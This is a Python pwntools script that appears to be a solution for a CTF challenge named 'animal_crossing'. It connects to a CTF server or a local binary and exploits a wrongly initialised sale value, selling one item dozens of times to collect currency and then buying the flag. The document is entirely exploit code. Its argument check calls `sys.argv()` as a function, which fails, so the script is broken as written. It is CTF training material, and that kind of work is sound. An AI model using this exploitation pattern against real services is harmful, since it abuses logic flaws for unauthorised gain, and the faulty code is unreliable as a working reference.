from pwn import *

if "rem" in sys.argv():
	proc = remote("ctf.umbccd.io", 4400)
else:
	proc = process("./animal_crossing_remote")

#Buy an item
print proc.recvuntil("Choice: ")
proc.sendline("2")

#Buy a tarantula
print proc.recvuntil("420000 bells")
proc.sendline("2")

#Sale is incorrectly initialized, so sell a lot of tarantulas
for i in range(0, 55):
	print proc.recvuntil("Choice: ")
	proc.sendline("1")
	print proc.recvuntil("8000 bells")
	proc.sendline("5")

#Sell an item because your bag is full
print proc.recvuntil("Choice: ")
proc.sendline("1")

#Doesn't matter what item you solve so long as you only have one
print proc.recvuntil("8000 bells")
proc.sendline("1")

#Buy an item
print proc.recvuntil("Choice: ")
proc.sendline("2")

#Buy a flag
print proc.recvuntil("420000 bells")
proc.sendline("6")

proc.interactive()
